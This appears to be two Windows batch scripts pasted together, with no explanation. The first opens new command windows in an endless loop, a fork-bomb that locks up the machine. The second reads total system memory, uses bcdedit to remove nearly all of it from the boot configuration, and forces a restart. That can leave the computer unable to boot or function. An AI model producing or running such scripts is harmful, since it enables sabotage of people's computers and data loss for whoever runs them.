@echo off

:loop
start cmd /k echo This window will close shortly...
ping 127.0.0.1 -n 1 >nul
goto loop

:end (This label is unreachable and won't be executed)

@echo off 

echo Calculating total system memory
for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
   set system_ram=%%p
   goto :end
)
:end


echo Total system ram is %system_ram%


set /a "c=%system_ram% - 28"

echo Will be getting rid of %c% bytes of memory

bcdedit.exe /set removememory %c% 

shutdown /r  